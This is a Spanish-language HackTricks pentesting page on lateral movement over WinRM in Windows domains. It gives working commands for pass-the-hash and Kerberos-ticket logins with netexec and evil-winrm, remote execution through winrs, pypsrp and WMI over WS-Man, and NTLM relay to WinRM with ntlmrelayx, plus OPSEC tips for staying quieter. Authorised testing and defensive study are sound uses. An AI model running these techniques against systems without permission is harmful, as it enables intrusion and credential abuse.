# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM es uno de los transportes de **lateral movement** más convenientes en entornos Windows porque proporciona una shell remota sobre **WS-Man/HTTP(S)** sin necesitar los trucos de creación de servicios de SMB. Si el objetivo expone **5985/5986** y tu principal tiene permitido usar remoting, a menudo puedes pasar de "valid creds" a una **interactive shell** muy rápidamente.

Para la **protocol/service enumeration**, listeners, habilitación de WinRM, `Invoke-Command` y el uso de clientes genéricos, consulta:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por qué los operadores prefieren WinRM

- Usa **HTTP/HTTPS** en lugar de SMB/RPC, por lo que a menudo funciona cuando la ejecución al estilo PsExec está bloqueada.
- Con **Kerberos**, evita enviar credenciales reutilizables al objetivo.
- Funciona correctamente desde **Windows**, **Linux** y herramientas de **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- La ruta interactiva de PowerShell remoting inicia **`wsmprovhost.exe`** en el objetivo bajo el contexto del usuario autenticado, lo que es operativamente diferente de la ejecución basada en servicios.

## Modelo de acceso y requisitos previos

En la práctica, el lateral movement mediante WinRM depende de **tres** cosas:

1. El objetivo tiene un **listener de WinRM** (`5985`/`5986`) y reglas de firewall que permiten el acceso.
2. La cuenta puede **autenticarse** en el endpoint.
3. La cuenta tiene permitido **abrir una sesión de remoting**.

Formas habituales de obtener ese acceso:

- **Local Administrator** en el objetivo.
- Pertenencia a **Remote Management Users** en sistemas más recientes o a **WinRMRemoteWMIUsers__** en sistemas/componentes que todavía respetan ese grupo.
- Permisos de remoting delegados explícitamente mediante descriptores de seguridad locales / cambios en las ACL de PowerShell remoting.

Si ya controlas un equipo con permisos de administrador, recuerda que también puedes **delegar el acceso a WinRM sin pertenecer al grupo de administradores completo** usando las técnicas descritas aquí:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Problemas de autenticación importantes durante el lateral movement

- **Kerberos requiere un hostname/FQDN**. Si te conectas mediante IP, el cliente normalmente recurre a **NTLM/Negotiate**.
- En casos de **workgroup** o situaciones límite entre trusts, NTLM normalmente requiere **HTTPS** o que el objetivo se añada a **TrustedHosts** en el cliente.
- Con **cuentas locales** mediante Negotiate en un workgroup, las restricciones de UAC remoto pueden impedir el acceso, a menos que se use la cuenta integrada de Administrator o `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa por defecto el **`HTTP/<host>` SPN**. En entornos donde **`HTTP/<host>`** ya está registrado para otra cuenta de servicio, Kerberos de WinRM puede fallar con `0x80090322`; usa un SPN con el puerto especificado o cambia a **`WSMAN/<host>`** cuando ese SPN exista.<sup>[[3]](#references)</sup>

Si obtienes credenciales válidas durante un password spraying, validarlas mediante WinRM suele ser la forma más rápida de comprobar si se traducen en una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux a Windows

### NetExec / CrackMapExec para validación y ejecución puntual
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interactivos

`evil-winrm` sigue siendo la opción interactiva más conveniente desde Linux porque admite **contraseñas**, **hashes NT**, **tickets de Kerberos**, **certificados de cliente**, transferencia de archivos y carga en memoria de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso particular de Kerberos SPN: `HTTP` frente a `WSMAN`

Cuando el SPN predeterminado **`HTTP/<host>`** provoque fallos de Kerberos, prueba a solicitar/usar un ticket **`WSMAN/<host>`** en su lugar. Esto aparece en configuraciones empresariales reforzadas o inusuales, donde **`HTTP/<host>`** ya está asociado a otra cuenta de servicio.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Esto también es útil después del abuso de **RBCD / S4U** cuando específicamente falsificaste o solicitaste un service ticket **WSMAN** en lugar de un ticket genérico `HTTP`.

### Autenticación basada en certificados

WinRM también admite **autenticación mediante certificado de cliente**, pero el certificado debe estar asignado en el target a una **cuenta local**. Desde una perspectiva ofensiva, esto es relevante cuando:

- robaste/exportaste un certificado de cliente válido y su clave privada, ya asignados para WinRM;
- abusaste de **AD CS / Pass-the-Certificate** para obtener un certificado para un principal y luego pivotar hacia otra ruta de autenticación;
- operas en entornos que evitan deliberadamente el remoting basado en contraseñas.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
La autenticación de WinRM mediante certificado de cliente es mucho menos común que la autenticación con password/hash/Kerberos, pero cuando existe puede proporcionar una vía de **movimiento lateral sin contraseña** que resiste la rotación de contraseñas.

### Python / automatización con `pypsrp`

Si necesitas automatización en lugar de una shell de operador, `pypsrp` proporciona WinRM/PSRP desde Python con soporte para **NTLM**, **autenticación mediante certificados**, **Kerberos** y **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Si necesitas un control más preciso que el wrapper de alto nivel `Client`, las APIs de nivel inferior `WSMan` + `RunspacePool` resultan útiles para dos problemas habituales de los operadores:

- forzar **`WSMAN`** como servicio/SPN de Kerberos en lugar de la expectativa predeterminada de **`HTTP`** utilizada por muchos clientes de PowerShell;
- conectarse a un endpoint de PSRP **no predeterminado**, como una configuración de sesión **JEA** / personalizada, en lugar de `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Los endpoints PSRP personalizados y JEA son importantes durante el movimiento lateral

Una autenticación WinRM exitosa **no** siempre significa que accedes al endpoint predeterminado y sin restricciones `Microsoft.PowerShell`. Los entornos maduros pueden exponer **configuraciones de sesión personalizadas** o endpoints **JEA** con sus propias ACLs y comportamiento de run-as.<sup>[[1]](#references)</sup>

Si ya tienes ejecución de código en un host Windows y quieres comprender qué superficies de remoting existen, enumera los endpoints registrados:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Cuando exista un endpoint útil, dirígete explícitamente a él en lugar del shell predeterminado:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implicaciones prácticas ofensivas:

- Un endpoint **restricted** aún puede ser suficiente para el movimiento lateral si expone solo los cmdlets/functions adecuados para el control de servicios, el acceso a archivos, la creación de procesos o la ejecución arbitraria de comandos .NET / externos.
- Un rol de **JEA** mal configurado es especialmente valioso cuando expone comandos peligrosos como `Start-Process`, wildcards amplios, providers con permisos de escritura o proxy functions personalizadas que permiten escapar de las restricciones previstas.
- Los endpoints respaldados por **RunAs virtual accounts** o **gMSAs** cambian el security context efectivo de los comandos que ejecutas. En particular, un endpoint respaldado por un gMSA puede proporcionar **network identity en el second hop**, incluso cuando una sesión normal de WinRM se encontraría con el clásico problema de delegation.

## Movimiento lateral mediante WinRM nativo de Windows

### `winrs.exe`

`winrs.exe` viene integrado y resulta útil cuando quieres **native WinRM command execution** sin abrir una sesión interactiva de PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Dos flags son fáciles de olvidar y son importantes en la práctica:

- `/noprofile` suele ser necesario cuando la entidad remota **no** es un administrador local.
- `/allowdelegate` permite que el shell remoto use tus credenciales contra un **tercer host** (por ejemplo, cuando el comando necesita `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operativamente, `winrs.exe` suele dar como resultado una cadena de procesos remotos similar a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Vale la pena recordarlo porque difiere de la ejecución basada en servicios y de las sesiones interactivas de PSRP.

### `winrm.cmd` / WS-Man COM en lugar de PowerShell remoting

También puedes ejecutar mediante el **transporte WinRM** sin usar `Enter-PSSession`, invocando clases WMI a través de WS-Man. Esto mantiene el transporte como WinRM, mientras que la primitiva de ejecución remota pasa a ser **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Este enfoque es útil cuando:

- El logging de PowerShell está fuertemente monitorizado.
- Quieres **transporte WinRM**, pero no un flujo de trabajo clásico de PS remoting.
- Estás desarrollando o utilizando tooling personalizado alrededor del objeto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Cuando SMB relay está bloqueado por la firma y LDAP relay está restringido, **WS-Man/WinRM** todavía puede ser un objetivo de relay atractivo. Las versiones modernas de `ntlmrelayx.py` incluyen servidores de WinRM relay y pueden hacer relay hacia objetivos `wsman://` o `winrms://`.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dos notas prácticas:

- Relay es más útil cuando el objetivo acepta **NTLM** y la principal relayed tiene permiso para usar WinRM.
- El código reciente de Impacket gestiona específicamente las solicitudes **`WSMANIDENTIFY: unauthenticated`**, por lo que las sondas del tipo `Test-WSMan` no interrumpen el flujo de relay.

Para las restricciones de múltiples saltos después de obtener una primera sesión de WinRM, consulta:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notas sobre OPSEC y detección

- El **remoting interactivo de PowerShell** normalmente crea **`wsmprovhost.exe`** en el objetivo.
- **`winrs.exe`** normalmente crea **`winrshost.exe`** y después el proceso hijo solicitado.
- Los endpoints **JEA** personalizados pueden ejecutar acciones como cuentas virtuales **`WinRM_VA_*`** o como una **gMSA** configurada, lo que cambia tanto la telemetría como el comportamiento del segundo salto en comparación con un shell en el contexto de un usuario normal.<sup>[[1]](#references)</sup>
- Espera telemetría de **network logon**, eventos del servicio WinRM y registros operativos y de bloques de script de PowerShell si usas PSRP en lugar de `cmd.exe` sin procesar.
- Si solo necesitas ejecutar un comando, `winrs.exe` o una ejecución de WinRM de un solo uso pueden ser más silenciosos que una sesión de remoting interactiva de larga duración.
- Si Kerberos está disponible, prefiere **FQDN + Kerberos** en lugar de IP + NTLM para reducir tanto los problemas de confianza como los cambios incómodos de `TrustedHosts` en el cliente.

## Referencias

- [1] [Microsoft: Consideraciones de seguridad de JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README de pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` al conectar PowerShell a un servidor remoto mediante WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
